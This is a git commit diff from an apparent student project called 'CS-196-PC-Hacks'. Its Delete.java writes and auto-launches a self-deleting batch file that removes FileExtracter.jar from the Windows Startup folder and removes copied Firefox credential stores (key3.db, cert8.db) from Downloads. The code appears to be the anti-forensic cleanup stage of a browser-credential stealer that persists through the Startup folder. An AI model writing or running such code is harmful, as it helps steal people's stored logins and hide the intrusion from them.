cbef3b5dbb2f7c9f32522f3def226993c5e6b9d3
kchang33 <kchang33@illinois.edu>
2014-12-08 09:35:24 -0600

    AutorunBat

--- Delete.java
+++ Delete.java
@@ -3,19 +3,20 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
-
-
+import java.lang.Runtime;
 public class Delete {
 	public static void main(String[] args){
 		try {
 			//stuff to put into bat
+			
 			String address1 = "\"%USERPROFILE%\\Downloads\\";
 			String address2 = "\r\ndel \"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
 		    String del = "\r\ndel ";
 		    String content = "ECHO OFF "+address2+"FileExtracter.jar\" "
 		    				+del+address1+"\\key3.db\" "
 		    				+del+address1+"\\cert8.db\" "
-		    				+del+address2+"del.bat\" ";
+		    				+del+address2+"del.bat\" "
+		    				+"&& exit";
 			
 		    
 		    File file = new File("del.txt");
@@ -37,10 +38,10 @@ public class Delete {
 		    File file1 = new File("del.txt");
 		    File file2 = new File("del.bat");
 		    file1.renameTo(file2);
+		    Runtime.getRuntime().exec("cmd /c start del.bat");
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
-		
 
 
 	}
--- FireExtinguisher/bin/Debug/text.bat
+++
@@ -1,3 +0,0 @@
-del  "C:\Users\USER\Documents\GitHub\CS-196-PC-Hacks\FireExtinguisher\Extinguisher.exe"
-del  "C:\Users\USER\Documents\GitHub\CS-196-PC-Hacks\FireExtinguisher\text.bat"
-timeout /t 5
